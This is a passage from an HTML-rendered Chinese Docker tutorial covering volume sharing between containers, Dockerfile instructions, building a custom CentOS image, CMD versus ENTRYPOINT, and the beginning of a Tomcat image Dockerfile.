class="line">8a29a15cefae: Already exists </span><br><span class="line">Digest: sha256:fe8d824220415eed5477b63addf40fb06c3b049404242b31982106ac204f6700</span><br><span class="line">Status: Downloaded newer image for centos:latest</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 470671670cac</span></span><br><span class="line">Step 2/4 : VOLUME ["volume01","volume02"] # 卷名列表</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> c18eefc2c233</span></span><br><span class="line">Removing intermediate container c18eefc2c233</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 623ae1d40fb8</span></span><br><span class="line">Step 3/4 : CMD echo "-----end-----"# 输出 脚本命令</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 70e403669f3c</span></span><br><span class="line">Removing intermediate container 70e403669f3c</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 0eba1989c4e6</span></span><br><span class="line">Step 4/4 : CMD /bin/bash</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 4342feb3a05b</span></span><br><span class="line">Removing intermediate container 4342feb3a05b</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> f4a6b0d4d948</span></span><br><span class="line">Successfully built f4a6b0d4d948</span><br><span class="line">Successfully tagged caoshipeng/centos:latest</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看自己构建的镜像</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker images</span></span><br><span class="line">REPOSITORY          TAG          IMAGE ID            CREATED              SIZE</span><br><span class="line">caoshipeng/centos   latest       f4a6b0d4d948        About a minute ago   237MB</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEyMTIyMTA2Ni5wbmc?x-oss-process=image/format,png" alt="img"></p><blockquote><p>启动自己写的容器镜像</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -it f4a6b0d4d948 /bin/bash<span class="comment"># 运行自己写的镜像</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l <span class="comment"># 查看目录</span></span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEyMTQ1OTAyNi5wbmc?x-oss-process=image/format,png" alt="img"></p><p>这个卷和外部一定有一个同步的目录</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEyMTUzMTYyNi5wbmc?x-oss-process=image/format,png" alt="img"></p><p>查看一下卷挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker inspect 容器id</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker inspect ca3b45913df5</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEyMTYzMDI5NS5wbmc?x-oss-process=image/format,png" alt="img"></p><p>测试一下刚才的文件是否同步出去了！</p><p><img src="https://img-blog.csdnimg.cn/20200524154444736.png#pic_center" alt="在这里插入图片描述"></p><p>这种方式使用的十分多，因为我们通常会构建自己的镜像！</p><p>假设构建镜像时候没有挂载卷，要手动镜像挂载 -v 卷名：容器内路径！</p><h2 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h2><p><strong>多个MySQL同步数据</strong>！</p><p>命名的容器挂载数据卷！</p><p><img src="https://img-blog.csdnimg.cn/20200524154518325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU5MTk4MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 测试 启动3个容器，通过刚才自己写的镜像启动</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建docker01：因为我本机是最新版，故这里用latest，狂神老师用的是1.0如下图</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -it --name docker01 caoshipeng/centos:latest</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器docekr01内容</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">bin  home   lost+foundopt   run   sys  var</span><br><span class="line">dev  lib    mediaproc  sbin  tmp  volume01</span><br><span class="line">etc  lib64  mntroot  srv   usr  volume02</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 不关闭该容器退出</span></span><br><span class="line">CTRL + Q + P  </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建docker02: 并且让docker02 继承 docker01</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -it --name docker02 --volumes-from docker01 caoshipeng/centos:latest</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器docker02内容</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">bin  home   lost+foundopt   run   sys  var</span><br><span class="line">dev  lib    mediaproc  sbin  tmp  volume01</span><br><span class="line">etc  lib64  mntroot  srv   usr  volume02</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEyMzAyMDA1MC5wbmc?x-oss-process=image/format,png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200524154539606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU5MTk4MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 再新建一个docker03同样继承docker01</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -it --name docker03 --volumes-from docker01 caoshipeng/centos:latest</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> volume01<span class="comment">#进入volume01 查看是否也同步docker01的数据</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls </span></span><br><span class="line">docker01.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 测试：可以删除docker01，查看一下docker02和docker03是否可以访问这个文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 测试发现：数据依旧保留在docker02和docker03中没有被删除</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEyMzM1NTAzNC5wbmc?x-oss-process=image/format,png" alt="img"></p><p><strong>多个mysql实现数据共享</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 3306:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 3310:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01  mysql:5.7</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这个时候，可以实现两个容器数据同步！</span></span><br></pre></td></tr></table></figure><p>结论：</p><p><strong>容器之间的配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止</strong>。</p><p><strong>但是一旦你持久化到了本地，这个时候，本地的数据是不会删除的</strong>！</p><h2 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h2><h4 id="DockerFile介绍"><a href="#DockerFile介绍" class="headerlink" title="DockerFile介绍"></a>DockerFile介绍</h4><p><code>dockerfile</code>是用来构建docker镜像的文件！命令参数脚本！</p><p>构建步骤：</p><p>1、 编写一个dockerfile文件</p><p>2、 docker build 构建称为一个镜像</p><p>3、 docker run运行镜像</p><p>4、 docker push发布镜像（DockerHub 、阿里云仓库)</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEzMTQwMDQ1Ni5wbmc?x-oss-process=image/format,png" alt="img"></p><p>点击后跳到一个Dockerfile</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEzMTQ0MTc1MC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>很多官方镜像都是基础包，很多功能没有，我们通常会自己搭建自己的镜像！</p><p>官方既然可以制作镜像，那我们也可以！</p><h4 id="DockerFile构建过程"><a href="#DockerFile构建过程" class="headerlink" title="DockerFile构建过程"></a>DockerFile构建过程</h4><p><strong>基础知识</strong>：</p><p>1、每个保留关键字(指令）都是必须是大写字母</p><p>2、执行从上到下顺序</p><p>3、#表示注释</p><p>4、每一个指令都会创建提交一个新的镜像曾，并提交！</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEzMTc1Njk5Ny5wbmc?x-oss-process=image/format,png" alt="img"></p><p>Dockerfile是面向开发的，我们以后要发布项目，做镜像，就需要编写dockerfile文件，这个文件十分简单！</p><p>Docker镜像逐渐成企业交付的标准，必须要掌握！</p><p>DockerFile：构建文件，定义了一切的步骤，源代码</p><p>DockerImages：通过DockerFile构建生成的镜像，最终发布和运行产品。</p><p>Docker容器：容器就是镜像运行起来提供服务。</p><h4 id="DockerFile的指令"><a href="#DockerFile的指令" class="headerlink" title="DockerFile的指令"></a>DockerFile的指令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM# from:基础镜像，一切从这里开始构建</span><br><span class="line">MAINTAINER# maintainer:镜像是谁写的， 姓名+邮箱</span><br><span class="line">RUN# run:镜像构建的时候需要运行的命令</span><br><span class="line">ADD# add:步骤，tomcat镜像，这个tomcat压缩包！添加内容 添加同目录</span><br><span class="line">WORKDIR# workdir:镜像的工作目录</span><br><span class="line">VOLUME# volume:挂载的目录</span><br><span class="line">EXPOSE# expose:保留端口配置</span><br><span class="line">CMD# cmd:指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span><br><span class="line">ENTRYPOINT# entrypoint:指定这个容器启动的时候要运行的命令，可以追加命令</span><br><span class="line">ONBUILD# onbuild:当构建一个被继承DockerFile这个时候就会运行onbuild的指令，触发指令</span><br><span class="line">COPY# copy:类似ADD，将我们文件拷贝到镜像中</span><br><span class="line">ENV# env:构建的时候设置环境变量！</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200524154609624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU5MTk4MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h4><p>scratch 镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FROM scratch</span><br><span class="line">ADD centos-7-x86_64-docker.tar.xz /</span><br><span class="line"></span><br><span class="line">LABEL \</span><br><span class="line">    org.label-schema.schema-version="1.0" \</span><br><span class="line">    org.label-schema.name="CentOS Base Image" \</span><br><span class="line">    org.label-schema.vendor="CentOS" \</span><br><span class="line">    org.label-schema.license="GPLv2" \</span><br><span class="line">    org.label-schema.build-date="20200504" \</span><br><span class="line">    org.opencontainers.image.title="CentOS Base Image" \</span><br><span class="line">    org.opencontainers.image.vendor="CentOS" \</span><br><span class="line">    org.opencontainers.image.licenses="GPL-2.0-only" \</span><br><span class="line">    org.opencontainers.image.created="2020-05-04 00:00:00+01:00"</span><br><span class="line"></span><br><span class="line">CMD ["/bin/bash"]</span><br></pre></td></tr></table></figure><p><strong>Docker Hub 中 99%的镜像都是从这个基础镜像过来的 FROM scratch</strong>，然后配置需要的软件和配置来进行构建。</p><p><img src="https://img-blog.csdnimg.cn/20200524154740467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU5MTk4MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><blockquote><p>创建一个自己的centos</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1./home下新建dockerfile目录</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir dockerfile</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. dockerfile目录下新建mydockerfile-centos文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim mydockerfile-centos</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3.编写Dockerfile配置文件</span></span><br><span class="line">FROM centos# 基础镜像是官方原生的centos</span><br><span class="line">MAINTAINER cao&lt;1165680007@qq.com&gt; # 作者</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local# 配置环境变量的目录 </span><br><span class="line">WORKDIR $MYPATH# 将工作目录设置为 MYPATH</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim# 给官方原生的centos 增加 vim指令</span><br><span class="line">RUN yum -y install net-tools# 给官方原生的centos 增加 ifconfig命令</span><br><span class="line"></span><br><span class="line">EXPOSE 80# 暴露端口号为80</span><br><span class="line"></span><br><span class="line">CMD echo $MYPATH# 输出下 MYPATH 路径</span><br><span class="line">CMD echo "-----end----"</span><br><span class="line">CMD /bin/bash# 启动后进入 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 4.通过这个文件构建镜像</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令： docker build -f 文件路径 -t 镜像名:[tag] .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -f mydockerfile-centos -t mycentos:0.1 .</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 5.出现下图后则构建成功</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE0MDgzMTQ2NC5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker images</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">mycentos            0.1                 cbf5110a646d        2 minutes ago       311MB</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 6.测试运行</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -it mycentos:0.1 <span class="comment"># 注意带上版本号，否则每次都回去找最新版latest</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/usr/local# 与Dockerfile文件中 WORKDIR 设置的 MYPATH 一致</span><br><span class="line"><span class="meta">$</span><span class="bash"> vim<span class="comment"># vim 指令可以使用</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ifconfig     <span class="comment"># ifconfig 指令可以使用</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker <span class="built_in">history</span> 镜像id 查看镜像构建历史步骤</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">history</span> 镜像id</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE0MTYyOTU4My5wbmc?x-oss-process=image/format,png" alt="img"></p><p>我们可以列出本地进行的变更历史</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE0MTg0MDcwNi5wbmc?x-oss-process=image/format,png" alt="img"></p><p>我们平时拿到一个镜像，可以用 “docker history 镜像id” 研究一下是什么做的</p><blockquote><p>CMD 和 ENTRYPOINT区别</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMD# 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代。</span><br><span class="line">ENTRYPOINT# 指定这个容器启动的时候要运行的命令，可以追加命令</span><br></pre></td></tr></table></figure><p><strong>测试cmd</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编写dockerfile文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim dockerfile-test-cmd</span></span><br><span class="line">FROM centos</span><br><span class="line">CMD ["ls","-a"]# 启动后执行 ls -a 命令</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建镜像</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build  -f dockerfile-test-cmd -t cmd-test:0.1 .</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行镜像</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run cmd-test:0.1<span class="comment"># 由结果可得，运行后就执行了 ls -a 命令</span></span></span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 想追加一个命令  -l 成为ls -al：展示列表详细数据</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run cmd-test:0.1 -l</span></span><br><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:349: starting container process caused "exec: \"-l\":</span><br><span class="line">executable file not found in $PATH": unknown.</span><br><span class="line">ERRO[0000] error waiting for container: context canceled </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cmd的情况下 -l 替换了CMD[<span class="string">"ls"</span>,<span class="string">"-l"</span>] 而 -l  不是命令所以报错</span></span><br></pre></td></tr></table></figure><p><strong>测试ENTRYPOINT</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编写dockerfile文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim dockerfile-test-entrypoint</span></span><br><span class="line">FROM centos</span><br><span class="line">ENTRYPOINT ["ls","-a"]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建镜像</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build  -f dockerfile-test-entrypoint -t cmd-test:0.1 .</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行镜像</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run entrypoint-test:0.1</span></span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found ...</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 我们的命令，是直接拼接在我们得ENTRYPOINT命令后面的</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run entrypoint-test:0.1 -l</span></span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x   1 root root 4096 May 16 06:32 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 May 16 06:32 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 May 16 06:32 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 11  2019 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   5 root root  340 May 16 06:32 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 May 16 06:32 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 11  2019 home</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 11  2019 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx   1 root root    9 May 11  2019 lib64 -&gt; usr/lib64 ....</span><br></pre></td></tr></table></figure><p>Dockerfile中很多命令都十分的相似，我们需要了解它们的区别，我们最好的学习就是对比他们然后测试效果！</p><h2 id="实战：Tomcat镜像"><a href="#实战：Tomcat镜像" class="headerlink" title="实战：Tomcat镜像"></a>实战：Tomcat镜像</h2><h5 id="1、准备镜像文件"><a href="#1、准备镜像文件" class="headerlink" title="1、准备镜像文件"></a>1、准备镜像文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">准备tomcat 和 jdk 到当前目录，编写好README</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE2MjQ0MzY1Mi5wbmc?x-oss-process=image/format,png" alt="img"></p><h2 id="解决时区不一致"><a href="#解决时区不一致" class="headerlink" title="==解决时区不一致=="></a>==解决时区不一致==</h2><h5 id="2、编写dokerfile"><a href="#2、编写dokerfile" class="headerlink" title="2、编写dokerfile"></a>2、编写dokerfile</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim dockerfile</span></span><br><span class="line">FROM centos # 基础镜像centos</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解决时区不一致</span></span><br><span class="line">ENV TIME_ZONE=Asia/Shanghai</span><br><span class="line">RUN cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime </span><br><span class="line">RUN echo "Asia/Shanghai" &gt; /etc/timezone</span><br><span class="line">RUN date</span><br><span class="line"></span><br><span class="line">MAINTAINER cao&lt;1165680007@qq.com&gt;# 作者</span><br><span class="line">COPY README /usr/local/README # 复制README文件</span><br><span class="line">ADD jdk-8u231-linux-x64.tar.gz /usr/local/ # 添加jdk，ADD 命令会自动解压</span><br><span class="line">ADD apache-tomcat-9.0.35.tar.gz /usr/local/ # 添加tomcat，ADD 命令会自动解压</span><br><span class="line">RUN yum -y install vim# 安装 vim 命令</span><br><span class="line">ENV MYPATH /usr/local # 环境变量设置 工作目录</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_231 # 环境变量： JAVA_HOME环境变量</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"></span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.35 # 环境变量： tomcat环境变量</span><br><span class="line">ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.35</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置环境变量 分隔符是：</span></span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin </span><br><span class="line"></span><br><span class="line">EXPOSE 8080 # 设置暴露的端口</span><br><span class="line"></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.35/bin/startup.sh &amp;&amp; tail -F 